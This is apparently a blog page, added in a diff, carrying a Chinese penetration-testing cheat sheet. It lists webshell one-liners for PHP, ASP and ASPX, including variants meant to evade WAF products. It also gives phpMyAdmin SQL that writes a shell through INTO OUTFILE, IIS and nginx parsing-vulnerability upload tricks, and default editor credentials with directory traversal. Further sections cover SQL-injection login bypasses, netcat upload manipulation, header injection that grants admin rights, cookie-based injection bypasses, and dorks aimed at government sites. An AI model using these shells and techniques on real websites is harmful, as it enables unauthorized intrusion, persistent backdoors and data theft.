+                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">RSS</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
+</nav>
+
+            
+            <div id="main" data-behavior="4"
+                 class="
+                        hasCoverMetaIn
+                        ">
+                
+<article class="post">
+    
+    
+        <div class="post-header main-content-wrap text-left">
+    
+        <h1 class="post-title">
+            渗透笔记
+        </h1>
+    
+    
+        <div class="post-meta">
+    <time datetime="2017-03-01T16:49:11+08:00">
+	
+		    01 3月 2017
+    	
+    </time>
+    
+        <span>in </span>
+        
+    <a class="category-link" href="/categories/渗透测试/">渗透测试</a>
+
+
+    
+</div>
+
+    
+</div>
+
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <p><strong>渗透笔记</strong><br>【 常见网站程序 】<br>—————————————————————————————–<br>asp类：<br>foosun(风讯)<br>kesion(科汛)newasp(新云)<br>乔客CreateLive(创力)<br>5uCMSKingCMS<br>DvBBS(动网)<br>BBSxp[博客]zblog<br>[博客]pjblog<br>—————————————————————————————–<br>PHP类：<br>DeDeCms（织梦）<br>ECMS（帝国）<br>PHPCMS<br>PHP168<br>HBcms（宏博）SupeSite<br>CMSware(思维)Joomla!<br>[BBS]Discuz!<br>[BBS]phpWind[SNS]UCenterHome<br>[SNS]ThinkSNS[商城]EcShop<br>[商城]ShopEx[博客]WordPress<br>[维基]HDWiki<br>[微博]PHPsay[DIGG]PBdigg<br>—————————————————————————————–<br><a id="more"></a><br>php开源mysql绝对路径<br>开源系统 数据库配置文件名 文件名所在的目录</p>
+<p>Discuz! config.inc.php ./ config.inc.php</p>
+<p>Phpcms config.inc.php ./include/config.inc.php</p>
+<p>Wodpress wp-config.php ./ wp-config.php</p>
+<p>Phpwind sqlconfig.php ./data/sqlconfig.php</p>
+<p>phpweb config.inc.php ./config.inc.php</p>
+<p>Php168v6 mysql_config.php ./php168/ mysql_config.php</p>
+<p>Shopex config.php ./config/config.php</p>
+<p>Ecshop config.php ./data/config.php</p>
+<p>Joomla configuration.php ./ configuration.php</p>
+<p>UCenter config.inc.php ./data/config.inc.php</p>
+<p>EmpireCMS config.php ./e/class/config.php</p>
+<p>Dedecms common.inc.php .data/common.inc.php</p>
+<p>Zen Cart configure.php ./includes/configure.php</p>
+<p>Mediawiki localsettints.php ./config/localsettints.php</p>
+<p>Ecshop config.php ./data/config.php</p>
+<p>osCommerce configure.php ./includes/configure.php</p>
+<p>—————————————————————————————–</p>
+<p>【 谷歌语法 】</p>
+<p>site：可以限制你搜索范围的域名.</p>
+<p>inurl：用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用.</p>
+<p>intext: 只搜索网页<body>部分中包含的文字(也就是忽略了标题、URL等的文字)</body></p>
+<p>intitle: 查包含关键词的页面，一般用于社工别人的webshell密码</p>
+<p>filetype：搜索文件的后缀或者扩展名</p>
+<p>intitle：限制你搜索的网页标题.</p>
+<p>link: 可以得到一个所有包含了某个指定URL的页面列表.</p>
+<p>查找后台地址：site:域名 inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms</p>
+<p>查找文本内容：site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username</p>
+<p>查找可注入点：site:域名 inurl:aspx|jsp|php|asp</p>
+<p>查找上传漏洞：site:域名 inurl:file|load|editor|Files</p>
+<p>找eweb编辑器：site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit</p>
+<p>存在的数据库：site:域名 filetype:mdb|asp|#</p>
+<p>查看脚本类型：site:域名 filetype:asp/aspx/php/jsp</p>
+<p>迂回策略入侵：inurl:cms/data/templates/images/index/<br>网络设备关键词：intext:WEB Management Interface for H3C SecPath Series</p>
+<p>==========================================================================================================================</p>
+<p>【 一句话木马 】</p>
+<p>asp一句话木马：&lt;%eval request(“x”)%&gt;</p>
+<p>php一句话木马：&lt;?php eval($_POST[g]);?&gt;</p>
+<p>aspx一句话：&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“x”],”unsafe”);%&gt;</p>
+<p>网站配置、版权信息专用一句话：”%&gt;&lt;%Eval Request(x)%&gt;</p>
+<p>一句话再过护卫神：&lt;%Y=request(“x”)%&gt; &lt;%execute(Y)%&gt;</p>
+<p>过拦截一句话木马：&lt;% eXEcGlOBaL ReQuEsT(“x”) %&gt;</p>
+<p>asp闭合型一句话 %&gt;&lt;%eval request(“0o1Znz1ow”)%&gt;&lt;%</p>
+<p>能过安全狗的解析格式：;hfdjf.;dfd.;dfdfdfd.asp;sdsd.jpg</p>
+<p>突破安全狗的一句话：&lt;%Y=request(“x”)%&gt; &lt;%eval(Y)%&gt;</p>
+<p>elong过安全狗的php一句话：&lt;?php $a = “a”.”s”.”s”.”e”.”r”.”t”; $a($_POST[cc]); ?&gt;</p>
+<p>后台常用写入php一句话（密码x）：</p>
+<p>&lt;?</p>
+<p>$fp = @fopen(“c.php”, ‘a’);</p>
+<p>@fwrite($fp, ‘&lt;‘.’?php’.”\r\n\r\n”.’eval($_POST[x])’.”\r\n\r\n?”.”&gt;\r\n”);</p>
+<p>@fclose($fp);</p>
+<p>?&gt;</p>
+<p>高强度php一句话：</p>
+<p>&lt;?php substr(md5($_REQUEST[‘heroes’]),28)==’acd0’&amp;&amp;eval($_REQUEST[‘c’]);?&gt;</p>
+<p>新型变异PHP一句话(密码b4dboy):</p>
+<p>($b4dboy = $_POST[‘b4dboy’]) &amp;&amp; @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);</p>
+<p>突破安全狗的aspx一句话：</p>
+<p>&lt;%@ Page Language=”C#” ValidateRequest=”false” %&gt;</p>
+<p>&lt;%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[“你的密码”].Value))).CreateInstance(“c”, true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null, null); } catch { }%&gt;</p>
+<p>突破护卫神，保护盾一句话：</p>
+<p>&lt;?php $a = str_replace(x,””,”axsxxsxexrxxt”);</p>
+<p>$a($_POST[“test”]); ?&gt;</p>
+<p>许多网页程序都不允许包含〈%%〉标记符号的内容的文件上传，这样一句话木马就写入不进数据库了。</p>
+<p>改成：〈scriptlanguage=VBScript runat=server〉execute request(“l”)〈/Script〉</p>
+<p>这样就避开了使用〈%%〉，保存为.ASP,程序照样执行的效果是一样的。</p>
+<p>PHP高强度一句话：</p>
+<p>&lt;?php substr(md5($_REQUEST[‘x’]),28)==’acd0’&amp;&amp;eval($_REQUEST[‘c’]);?&gt; 菜刀连接：/x.php?x=lostwolf 脚本类型：php 密码：c</p>
+<p>&lt;?php assert($_REQUEST[“c”]);?&gt; 菜刀连接 躲避检测 密码：c</p>
+<p>==========================================================================================================================</p>
+<p>【 解析漏洞总结 】</p>
+<p>IIS 6.0</p>
+<p>目录解析：/xx.asp/xx.jpg xx.jpg可替换为任意文本文件(e.g. xx.txt)，文本内容为后门代码</p>
+<p>IIS6.0 会将 xx.jpg 解析为 asp 文件。</p>
+<p>后缀解析：/xx.asp;.jpg /xx.asp:.jpg(此处需抓包修改文件名)</p>
+<p>IIS6.0 都会把此类后缀文件成功解析为 asp 文件。</p>
+<p>默认解析：/xx.asa /xx.cer /xx.cdx</p>
+<p>IIS6.0 默认的可执行文件除了 asp 还包含这三种</p>
+<p>此处可联系利用目录解析漏洞 /xx.asa/xx.jpg 或 /xx.cer/xx.jpg 或 xx.asa;.jpg</p>
+<p>IIS 7.0/ IIS 7.5/ Nginx &lt;8.03</p>
+<p>在默认Fast-CGI开启状况下,在一个文件路径(/xx.jpg)后面加上/xx.php会将 /xx.jpg/xx.php 解析为 php 文件。</p>
+<p>常用利用方法： 将一张图和一个写入后门代码的文本文件合并 将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾</p>
+<p>e.g.</p>
+<p>copy xx.jpg/b + yy.txt/a xy.jpg</p>
+<p>/b 即二进制[binary]模式</p>
+<p>/a 即ascii模式 xx.jpg正常图片文件</p>
+<p>yy.txt 内容 &lt;?PHP fputs(fopen(‘shell.php’,’w’),’&lt;?php eval($_POST[cmd])?&gt;’);?&gt;</p>
+<p>意思为写入一个内容为 &lt;?php eval($_POST[cmd])?&gt; 名称为shell.php的文件</p>
+<p>找个地方上传 xy.jpg ,然后找到 xy.jpg 的地址，在地址后加上 /xx.php 即可执行恶意文本。</p>
+<p>.然后就在图片目录下生成一句话木马 shell.php 密码 cmd</p>
+<p>==========================================================================================================================</p>
+<p>【 ewebeditor编辑器 】</p>
+<p>默认后台：ewebeditor/admin_login.asp</p>
+<p>帐号密码：admin admin</p>
+<p>样式设计：ewebeditor/admin_style.asp</p>
+<p>查看版本：ewebeditor/dialog/about.html</p>
+<p>数据库路径：db/ewebeditor.mdb db/%23ewebeditor.mdb db/%23ewebeditor.asp ewebeditor/db/!@#ewebeditor.asp (用谷歌语法找文件名)</p>
+<p>遍历目录：ewebeditor/admin/upload.asp?id=16&amp;d_viewmode=&amp;dir =../..</p>
+<p>跳转目录：ewebeditor/admin_uoloadfile.asp？id=14&amp;dir=.. (dir为列目录, ..为返回上层目录)，形式:dir ../..</p>
+<p>点上传文件管理-随便选择一个样式目录，得到：ewindoweditor/admin_uoloadfile.asp?id=14 在id=14后面加&amp;dir=../../../.. 就可看到整个网站的文件了(../自己加减)</p>
+<p>( ewebeditor5.5版本 )</p>
+<p>默认后台：ewebeditor/admin/login.asp</p>
+<p>帐号密码：admin 198625</p>
+<p>数据库路径：data/%23sze7xiaohu.mdb</p>
+<p>遍历目录：ewebeditor/admin/upload.asp?id=16&amp;d_viewmode=&amp;dir=../</p>
+<p>调用样式上传页面：ewebeditor/ewebeditor.htm?id=body&amp;style=popup</p>
+<p>( ewebeditor3.8 php版本 )</p>
+<p>默认后台：eWebEditor/admin/login.php</p>
+<p>首先随便输入一个帐号和密码，接着系统会提示出错，这时清空浏览器的url，然后输入以下代码后连按三次回车键：</p>
+<p>javascript:alert(document.cookie=”adminuser=”+escape(”admin”));javascript:alert(document.cookie=”adminpass=”+escape(”admin”));javascript:alert(document.cookie=”admindj=”+escape(”1”));</p>
+<p>接着访问文件：ewebeditor/admin/default.php 就可以直接进入后台了。</p>
+<p>( ewebeditor编辑器exp手册 )</p>
+<p>有时候什么后缀都上传了，还是不行。就增加一个asp:jpg格式 上传asp:jpg 试试</p>
+<p>一：文件上传成功了，但是访问不成功，说明该目录(比如：/UploadFile)被设置了权限，返回去换成/ 上传到根目录就行了.增加asp等不行的时候，可以利用解析asp;jpg</p>
+<p>二：下载数据库查看前人留下的痕迹，再访问上传页面拿shell。</p>
+<p>页面路径：/ewebeditor.asp?id=48&amp;style=popu7 用工具浏览数据库找到已添加asp|asa|cer|php的栏目，把S_ID跟S_Name的值替换在语句里访问，上传相对应的格式木马。</p>
+<p>==========================================================================================================================</p>
+<p>【 fckeditor编辑器 】</p>
+<p>查看版本：fckeditor/editor/dialog/fck_about.html</p>
+<p>编辑器页面：FCKeditor/_samples/default.html</p>
+<p>上传页面：fckeditor/editor/filemanager/connectors/test.html</p>
+<p>遍历目录：FCKeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=/</p>
+<p>编辑页面：fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/asp/connector.asp</p>
+<p>查看文件上传路径：fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=</p>
+<p>( 拿shell方法总结 )</p>
+<p>ASPX的站几乎都用fck编辑器，建议用工具扫一下，记住inc目录下可能存在fck编辑器，扫下这个目录。</p>
+<p>一：如果是iis6.0，上传两次 1.asp;.jpg 或者1.asp;1.jpg 或者创建x.asp目录，再在这个目录下上传x.jpg 或者直接上传1.asp;jpg 都可以完美解析拿下shell</p>
+<p>二：第一次上传1.asp;1.jpg，被重命名为：1_asp;1.jpg，但是第二次上传1.asp;1.jpg，就有可能变成：1.asp;1(1).jpg</p>
+<p>三：iis7.5+fck的解析文件为：a.aspx.a;.a.aspx.jpg..jpg.aspx</p>
+<p>四：如果不是iis6.0 上传1.asp;jpg然后抓包，接下来改包，将分号变成空格，再用c32把20改成00，保存，利用%00 截断分号两次</p>
+<p>五：成功访问别人的一句话木马页面，<a href="http://xx.com/UploadFiles\EditorFile\file/2.asp;2(1).jpg" target="_blank" rel="noopener">http://xx.com/UploadFiles\EditorFile\file/2.asp;2(1).jpg</a> 但不知道密码</p>
+<p><a href="http://xx.com/UploadFiles\EditorFile\file\2_asp;2.jpg" target="_blank" rel="noopener">http://xx.com/UploadFiles\EditorFile\file\2_asp;2.jpg</a> 这个是图片木马，没有成功利用iis6.0解析漏洞还是图片，下载下来用记事本打开找到密码。</p>
+<p>六：IIS7.0/7.5 通杀oday，把php一句话木马后缀改成1.jpg传上去，找出一句话的路径后，在1.jpg的后面添加/.php 例如：<a href="http://www.xxx.com/iges/php.jpg/.php" target="_blank" rel="noopener">http://www.xxx.com/iges/php.jpg/.php</a></p>
+<p>( 建立文件夹 . 变 _ 的突破方法 )</p>
+<p>利用Fiddler web debugger 这款工具来进行修改数据包，从而达到突破的目的。</p>
+<p>注意：安装Fiddler web debugger，需要安装.net环境以及.net的SP2补丁方可运行！</p>
+<p>1.打开fck的上传页面，例如：fckeditor/editor/filemanager/browser/default/connectors/test.html</p>
+<p>2.再打开Fiddler web debugger这款工具，点击设置–自动断点–选择 “请求之前”</p>
+<p>3.接着打开fck的上传页面，创建文件夹，并输入你想要创建的文件名，例如：x.asp</p>
+<p>4.然后返回到Fiddler web debugger这款工具里，选择链接–点击右侧的嗅探</p>
+<p>5.修改currentfolder内的参数，改成你要建立的文件夹名字，如：x.asp</p>
+<p>6.然后点击右侧的：run to completion</p>
+<p>7.再点击软件设置–自动断点–禁用，再到浏览器里点击确定建立文件夹，你就会发现文件夹建立为x.asp了</p>
+<p>==========================================================================================================================</p>
+<p>【 linux 】</p>
+<p>解析格式：1.php.xxx (xxx可以是任意)</p>
+<p>如果apache不认识后缀为rar的文件，我们就用1.php.rar格式上传，文件就会被服务器当做PHP脚本解析。</p>
+<p>辨别linux系统方法，例如：<a href="http://www.xxx.com/xxx/abc.asp?id=125" target="_blank" rel="noopener">http://www.xxx.com/xxx/abc.asp?id=125</a> 把b换成大写B访问，如果出错了，就说明是linux系统，反之是windows系统.</p>
+<p>==========================================================================================================================</p>
+<p>【 旁注 】</p>
+<p>旁注的技巧就是挑选支持aspx的站来日，这样提权时候希望较大，如何探测服务器上哪些站点支持aspx呢? 利用bing搜索：<a href="http://cn.bing.com/" target="_blank" rel="noopener">http://cn.bing.com/</a> 搜索格式：ip:服务器ip aspx</p>
+<p>比如要入侵一个网站，想知道该网站支不支持aspx，就在网站后面随便加上一个xxx.aspx回车，如果显示的不是iis默认的错误页面，而是这种：“/”应用程序中的服务器错误，说明支持aspx马。</p>
+<p>==========================================================================================================================</p>
+<p>【 phpmyadmin 】</p>
+<p>查看版本：test.php 或 phpinfo.php</p>
+<p>默认账号密码：root root</p>
+<p>万能帐号密码：’localhost’@’@” 密码空</p>
+<p>拿shell第一种方法：</p>
+<p>CREATE TABLE mysql.darkmoon (darkmoon1 TEXT NOT NULL );</p>
+<p>INSERT INTO mysql.darkmoon (darkmoon1 ) VALUES (‘&lt;?php @eval($_POST[pass]);?&gt;’);</p>
+<p>SELECT darkmoon1 FROM darkmoon INTO OUTFILE ‘d:/wamp/www/darkmoon.php’;</p>
+<p>DROP TABLE IF EXISTS darkmoon;<br>拿shell第二种方法：</p>
+<p>Create TABLE moon (darkmoon text NOT NULL);</p>
+<p>Insert INTO moon (darkmoon) VALUES(‘&lt;?php @eval($_POST[pass]);?&gt;’);</p>
+<p>select darkmoon from moon into outfile ‘d:/wamp/www/darkmoon2.php’;</p>
+<p>Drop TABLE IF EXISTS moon;<br>拿shell第三种方法：</p>
+<p>select ‘&lt;?php @eval($_POST[pass]);?&gt;’INTO OUTFILE ‘d:/wamp/www/darkmoon3.php’</p>
+<p>拿shell第四种方法</p>
+<p>select ‘&lt;?php echo \’<pre>\’;system($_GET[\’cmd\’]); echo \’</pre>\’; ?&gt;’ INTO OUTFILE ‘d:/wamp/www/darkmoon4.php’</p>
+<p>127.0.0.1/darkmoon4.php?cmd=net user<br>找到mysql数据库，执行sql语句即可写入一句话，再菜刀连接即可。</p>
+<p>phpmyadmin脱裤：在这里面是可以直接拖库的，如同上传php拖库脚本一样，操作差不多的。</p>
+<p>修改mysql默认的root用户名方法:</p>
+<p>进入phpmyadmin,进入mysql表,执行sql语句</p>
+<p>1.update user set user=’你的新root用户名’ where user=’root’;</p>
+<p>2.flush privileges;</p>
+<p>例如：</p>
+<p>用root身份登入，进入mysql库，修改user表即可。</p>
+<p>1.use mysql;<br>2.mysql&gt;update user set user=’newName’ where user=’root’;</p>
+<p>3.mysql&gt; flush privileges;</p>
+<p>==========================================================================================================================</p>
+<p>【 万能密码 】</p>
+<p>( php )</p>
+<p>帐号：’ UNION Select 1,1,1 FROM admin Where ”=’</p>
+<p>密码：1</p>
+<p>( asp )</p>
+<p>‘xor</p>
+<p>‘or’=’or’</p>
+<p>‘or”=”or”=’</p>
+<p>‘or ‘1’=’1’or ‘1’=’1</p>
+<p>‘or 1=1/*</p>
+<p>==========================================================================================================================</p>
+<p>【 批量关键词 】</p>
+<p>inurl:asp?id=</p>
+<p>inurl:detail.php?</p>
+<p>CompHonorBig.asp?id= 很不错的的一个搜索注入点</p>
+<p>inurl:show.asp? 非常强大</p>
+<p>site:<a href="http://www.yuming.com" target="_blank" rel="noopener">www.yuming.com</a></p>
+<p>inurl:articleshow.asp?articleid=数字</p>
+<p>inurl:szwyadmin/login.asp</p>
+<p>inurl:asp?id=1 intitle:政府</p>
+<p>杭州 inurl:Article_Class2.asp?</p>
+<p>==========================================================================================================================<br>【 木马后门 】</p>
+<p>1.TNTHK小组内部版 —— 存在关键词后门，随便输入一个错的密码，右键查看源文件，找到错误关键词后面的font，在font后面的就是正确密码。</p>
+<p>2.不灭之魂—不死僵尸变种 —— 用这款工具专门爆这款大马的密码：爆不灭之魂密码</p>
+<p>3.终极防删免杀多功能VIP版本-无后门 —— 万能密码：wbgz 菜刀连接：kk</p>
+<p>==========================================================================================================================</p>
+<p>【 安全狗 】</p>
+<p>1.过注入</p>
+<p>方法一：a.asp?aaa=%00&amp;id=sql语句</p>
+<p>方法二： a.asp?id=sql语句 里面把安全过滤的加个%l 比如： un%aion sel%aect 1,2,3,4 fr%aom admin</p>
+<p>2.过大马被阻拦访问</p>
+<p>方法一：上传一个大马 然后访问<a href="http://sss.com/dama.asp" target="_blank" rel="noopener">http://sss.com/dama.asp</a> ; 访问后出现拦截。</p>
+<p>那么解决方法 先将dama.asp改名dama.jpg上传，然后在同目录上传个文件da.asp 内容为： &lt;!–#include file=”dama.jpg” –&gt; 这样再访问da.asp 就不会被拦截了。</p>
+<p>3.过菜刀连接一句话被拦截</p>
+<p>方法一：不用菜刀连接一句话，用别的一句话连接端。</p>
+<p>方法二：中转下连接菜刀，把过滤掉的词替换掉。</p>
+<p>==========================================================================================================================<br>【 本地构造上传漏洞 】</p>
+<p>寻找程序上传漏洞，必须从上传页面的源文件入手，目标有两个：</p>
+<p>1.filename (文件名称) 在上传页面中针对文件扩展名过滤不严，从而上传可执行的脚本木马。</p>
+<p>2.filepath (文件路径) 在上传页面针对路径过滤不严，导致可以修改上传相对路径上传脚本木马。</p>
+<p>当检测到一个上传页面，asp、asa后缀已经被过滤掉的时候，可以尝试抓包明小子或NC上传！</p>
+<p>不行就利用本地上传漏洞构造上传！例如上传页面是：<a href="http://www.xx.com/upfile_other.asp" target="_blank" rel="noopener">http://www.xx.com/upfile_other.asp</a></p>
+<p>1.右键查看源文件，找到这段代码：&lt;form name=”form1″ method=”past” action=”zwhua_upload1.asp” enctype=”multipart/form-data”&gt;</p>
+<p>把以上代码中actino处的路径补全！即：&lt;form name=”form1″ method=”past” action=”<a href="http://www.xxx.com/zwhua_upload1.asp”" target="_blank" rel="noopener">http://www.xxx.com/zwhua_upload1.asp”</a> enctype=”multipart/form-data”&gt;</p>
+<p>2.再找到这段代码：&lt;input type=”hidden” name=”filepath” value=”uploadfile/”&gt;</p>
+<p>利用IIS6.0解析漏洞，把以上代码中value处的文件补全！即：&lt;input type=”hidden” name=”filepath” value=”uploadfile/1.asa; “&gt; 注意：冒号后面有空格！</p>
+<p>3.接着保存为1.html，将刚保存的文件拖进去C32里，选择十六进制模式，找到“1.asa; ”后面的空格，将其填充为00后保存退出！</p>
+<p>4.本地打开上传图片格式的木马(不成功时可以尝试上传一句话木马) ，如果提示成功后不显示路径的话，可以右键查看源文件自己手工找出路径访问即可！</p>
+<p>==========================================================================================================================</p>
+<p>【 利用双文件上传拿shell 】</p>
+<p>因为网站只判断一次，如果第一个文件后缀是在白名单里面的话，就让其上传，并没有判断第二个文件，所以上传任意格式的文件也让其通过。</p>
+<p>当系统验证cookie的时候，就要用到火狐浏览器了，登录网站进后台，让火狐浏览器保存管理员的cookie值，再把修改后的“双文件上传工具”拖进去上传。</p>
+<p>1.在后台找上传点，右键查看源文件，找到上传地址，一般在post或action的附近，搜索即可找到，一般为：src=”../xxx.htm” 之后补全路径访问。</p>
+<p>2.这个还不是真正的上传页面，真正的上传页面后缀是asp的，继续查看源代码，找到action=”xxx.asp”，补全路径访问即可！</p>
+<p>4.其实也可以抓包从而获得上传路径，抓包之后，在Referer:这栏，还有常见的是：htto://<a href="http://www.xxxx.com/upfile_other.asp" target="_blank" rel="noopener">www.xxxx.com/upfile_other.asp</a></p>
+<p>3.打开双文件上传工具，替换为当前的上传地址，保存后拖进火狐浏览器里，第一个选择jpg木马，第二个选择cer木马，提交后右键查看源文件找出路径即可。</p>
+<p>==========================================================================================================================</p>
+<p>【 数据库备份抓包改包NC提交拿shell 】</p>
+<p>当备份路径不能修改,后缀又是mdb不变的时候，我们可先对备份的过程进行抓包，再本地构造用NC提交即可突破备份，数据库恢复也可使用此方法！</p>
+<p>在抓包的时候，最好用火狐浏览器，因为有的浏览器抓不到包，首先上传一张图片木马复制下地址，接着对备份过程进行抓包！把抓到的数据复制在文本里面！</p>
+<p>开始本地修改，先把POST处补全网址，找到最底下的一行数据，再复制多一行对比长度进行修改，把备份的数据名称替换为木马地址，备份的名称改为自己想要的asp后缀！</p>
+<p>再将原来的数据长度跟现在的对比同时替换掉，最后看一共增加了多少个字符，就在Content-Length:处进行增减，用NC提交数据格式：nc 域名 80&lt;1.txt</p>
+<p>==========================================================================================================================</p>
+<p>【 本地构造数据库备份突破拿shell 】</p>
+<p>当上传jpg木马得到路径前去备份时，发现数据库备功能用不了的情况下，可以尝试本地构造突破拿shell！</p>
+<p>首先查看源文件，找到“当前数据库路径”修改为刚上传jpg木马的路径，再找到“数据库备份名称”修改为1.asa</p>
+<p>找到“<form method="”past”" action="”Backup.asp?action=Backup”">” 将路径补全“&lt;form method=”past” action=”<a href="http://xxx.com/admin/Backup.asp?action=Backup”&gt;”" target="_blank" rel="noopener">http://xxx.com/admin/Backup.asp?action=Backup”&gt;”</a></form></p>
+<p>最后保存为1.html，有的网站不验证cookie的话，直接打开进行备份就能成功了，但是一般都需要验证cookie，这时就用上火狐浏览器了。</p>
+<p>因为火狐浏览器有保留cookie的功能，先登录后台，以管理员的权限进行上传，直接把1.html拖进火狐浏览器里，直接点击备份即可突破cookie验证！</p>
+<p>==========================================================================================================================</p>
+<p>【 本地构造限制上传类型漏洞 】</p>
+<p>一般用于直接扫到的上传页面，名称是：上传图片，上传asp、asa等脚本时提示“请选择jpg或gif文件!”</p>
+<p>这时通过这个方法一般都能成功，首先保存到本地1.asp 放到小旋风的目录下，然后找到以下这段代码：</p>
+<p>alert(“请点击浏览按钮，选择您要上传的jpg或gif文件!”)</p>
+<p>myform.file1.focus;</p>
+<p>return (false);</p>
+<p>}</p>
+<p>else</p>
+<p>{</p>
+<p>str= myform.file1.value;</p>
+<p>strs=str.toLowerCase();</p>
+<p>lens=strs.length;</p>
+<p>extname=strs.substring(lens-4,lens);</p>
+<p>if(extname!=”.jpg” &amp;&amp; extname!=”.gif”)</p>
+<p>{</p>
+<p>alert(“请选择jpg或gif文件!”);</p>
+<p>看到这句代码：if(extname!=”.jpg” &amp;&amp; extname!=”.gif”) 改为： if(extname!=”.jpg” &amp;&amp; extname!=”.gif” &amp;&amp; extname!=”.asp”)</p>
+<p>然后补充完整上传地址，action=这里，然后网页打开127.0.0.1 直接上传asp文件就可以了。</p>
+<p>==========================================================================================================================</p>
+<p>【 抓包改包NC提交拿shell 】</p>
+<p>1.抓包数据中如果存在name=”filepath”或是name=”filename”，那么就可以满足NC的上传条件了。</p>
+<p>2.将木马的抓包数据复制到文本文件中。例如：1.txt</p>
+<p>3.将路径补全：</p>
+<p>filepath截断法：</p>
+<p>uploadfile/路径后添加1.asp空格 (16进制下面将20改为00)</p>
+<p>filename自定义名称：</p>
+<p>C:\Documents and Settings\lei\桌面\1.jpg (将1.jpg 改为 1.asp空格，16进制下将20改为00)</p>
+<p>3.在Content-Length处加上../uploadfile/后增加的字节数。</p>
+<p>4.用C32将空格的20改为00，保存为1.txt。</p>
+<p>5.把1.txt跟nc.exe放在同一目录下，cmd命令：nc -vv <a href="http://www.XXXX.com" target="_blank" rel="noopener">www.XXXX.com</a> 80&lt;1.txt</p>
+<p>( 如果上传成功后没有将木马解析成asp，可以尝试将文件名改成asa、cer、php 再不行就用IIS 6.0解析漏洞，将文件名改为1.asa;1.jpg )</p>
+<p>==========================================================================================================================</p>
+<p>【 抓包nc上传获取管理权限 】</p>
+<p>这个方法相当于cookie欺骗，首先到前台去注册一个会员，注册成功后在登录的那一刻，用抓包工具进行抓包，把抓到的数据复制到1.txt里面。</p>
+<p>接下来打开，把双引号里棉的数据“X-Forwarded-For: 127.0.0.2’,group_id = 1 where loginname = ‘会员的帐号’#” 放在Content-Length：的下面。</p>
+<p>在看到最底下的loginname=这行代码，把最后面的验证码改成当前会员登陆的验证码，然后将nc\1.txt 放在同一个目录下，cmd命令：nc 域名 80&lt;1.txt</p>
+<p>成功提交上去后，刚才的会员帐户将变成管理员帐户了，找到该站的后台地址登录即可实现cookie欺骗！</p>
+<p>==========================================================================================================================</p>
+<p>【 cookie欺骗 】</p>
+<p>当我们通过注入或是社工把管理员的帐号跟md5密码搞到手的时候，却发现破解不出密码 (MD5是16位加密的)</p>
+<p>那么我们就可以用COOKIE欺骗来绕过，利用桂林老兵的cookie欺骗工具，把自己的ID以及md5密码都修改成管理员的，再修改cookie，访问时就会实现欺骗了。</p>
+<p>==========================================================================================================================</p>
+<p>【 cookie中转突破防注入 】</p>
+<p>有时检测一个网站，系统会弹出一些SQL防注入的提示框，这时我们可以利用COOKIE中转注入来进行突破，首先准备一个webshell，然后打开COOKIE中转工具。</p>
+<p>复制注入点到“注入URL地址跟来源页”处，把问号去掉，再把问号后面的ID=剪切到“注入键名”里，再把ID=后面那个参数剪切到“POST提交值”里替换jmdcw=后面的参数。</p>
+<p>点击生成，再把生成的文件上传到webshell里，然后访问路径，再页面地址后面加“?jmdcw=参数”，这样搭建构造出来的注入点就绕过防注入了！</p>
+<p>以上是在webshell里搭建ASP坏境的方法，下面的是本地架设ASP环境的方法：</p>
+<p>利用简易IIS服务器搭建一个环境，再将COOKIE中转生成的文件放到简易IIS服务器的目录下！然后运行简易IIS服务器，在后面+文件名+问号+jmdcw=参数即可。</p>
+<p>==========================================================================================================================</p>
+<p>【 cookie手工突破防注入 】</p>
+<p>第一种方法：</p>
+<p>用 and 1=1 and 1=2 检测网站是否存在注入点时，如果提示你的IP已被记录，就说明系统做了防注入措施，可以用代码来突破。</p>
+<p>管理员只过滤了and，但是没有过滤or，我们可以先猜网站的字段数 格式：order by 数字 猜到错为止，然后选前一个对的数字！</p>
+<p>比如猜到14错误，那就是13了，然后利用Cookie提交变量值，代码：javascript:alert(document.cookie=id=”+escape(“这里填写变量值，例如：id=408”));</p>
+<p>开始猜解表段，代码：javascript:alert(document.cookie=”id=”+escape(“变量值 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13 from admin”));</p>
+<p>复制在浏览器里打开，将出现一个提示框，点击确定就会注射进去，再重新打开网站（要在此处打开，所以前面最好复制下网站地址）</p>
+<p>然后就会出现两个提示数字，比如5跟6，然后在代码的5跟6处猜帐号密码，常见的帐号有：user username 密码:pass password</p>
+<p>复制修改后的代码放到浏览器里打开，就会爆破出网站的帐号密码了。</p>
+<p>第二种方法：</p>
+<p>注入点：<a href="http://www.XXXXXXXX.gov.cn/shownews.asp?id=4098" target="_blank" rel="noopener">http://www.XXXXXXXX.gov.cn/shownews.asp?id=4098</a></p>
+<p>首先把?id=408去掉，然后访问如果提示“数据库出错”！就说明网站没有过滤Cookie提交方式，可以利用Cookie欺骗绕过防注入！</p>
+<p>利用Cookie提交变量值，代码：javascript:alert(document.cookie=”id=”+escape(“4098”)</p>
+<p>下面开始在Cookie注入中执行常规注入攻击，提交代码：javascript:alert(document.cookie=”id=”+escape(“4098 and 1=1”));</p>
+<p>访问<a href="http://www.XXXXXXXX.gov.cn/shownews.asp" target="_blank" rel="noopener">http://www.XXXXXXXX.gov.cn/shownews.asp</a> 显示正常页面，</p>
+<p>再提交代码：javascript:alert(document.cookie=”id=”+escape(“4098 and 1=2”)); 显示错误页面！</p>
+<p>下面来开始猜解表段，提交代码：javascript:alert(document.cookie=”id=”+escape(“4098 and exists (select * from 表段)”))；</p>
+<p>接着猜字段，提交代码：javascript:alert(document.cookie=”id=”+escape(“4098 and exists (select 字段 from admin)”))； 例如：username</p>
